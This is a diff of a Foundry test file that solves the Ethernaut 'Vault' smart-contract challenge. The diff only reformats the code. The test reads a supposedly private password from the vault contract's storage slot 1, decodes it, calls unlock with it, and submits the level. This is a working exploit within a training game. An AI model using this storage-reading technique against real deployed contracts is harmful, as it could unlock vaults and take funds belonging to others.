@@ -45,31 +45,17 @@ contract VaultTest is Test {
         //////////////////////////////////////////////////////////////*/
 
         emit log_string("Starting the exploit... 🧨");
-        emit log_string(
-            "Eve reads the password from the storage slot number 1..."
-        );
+        emit log_string("Eve reads the password from the storage slot number 1...");
 
-        bytes32 passwordFromStorage = vm.load(
-            address(vaultContract),
-            bytes32(uint256(1))
-        );
+        bytes32 passwordFromStorage = vm.load(address(vaultContract), bytes32(uint256(1)));
         emit log_named_bytes32("Password in bytes32: ", passwordFromStorage);
 
         emit log_string("Converting password to human-readable form... 🤓");
-        string memory passwordConverted = string(
-            abi.encodePacked(passwordFromStorage)
-        );
-        emit log_named_string(
-            "Password converted to string: ",
-            passwordConverted
-        );
+        string memory passwordConverted = string(abi.encodePacked(passwordFromStorage));
+        emit log_named_string("Password converted to string: ", passwordConverted);
 
-        emit log_string(
-            "Eve calls the unlock function with the aquired password... 🔑"
-        );
-        (bool success, ) = address(vaultContract).call(
-            abi.encodeWithSignature("unlock(bytes32)", passwordFromStorage)
-        );
+        emit log_string("Eve calls the unlock function with the aquired password... 🔑");
+        (bool success,) = address(vaultContract).call(abi.encodeWithSignature("unlock(bytes32)", passwordFromStorage));
         require(success, "Transaction failed");
 
         emit log_string("Vault lock cracked... 🔓");
@@ -78,9 +64,7 @@ contract VaultTest is Test {
                                 LEVEL SUBMISSION
         //////////////////////////////////////////////////////////////*/
 
-        bool challengeCompleted = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(challengeCompleted);
     }
@@ -98,9 +82,7 @@ contract VaultTest is Test {
      * an address for that person
      */
     function makeNameForAddress(string memory name) public returns (address) {
-        address addr = address(
-            uint160(uint256(keccak256(abi.encodePacked(name))))
-        );
+        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
         vm.label(addr, name);
         return addr;
     }
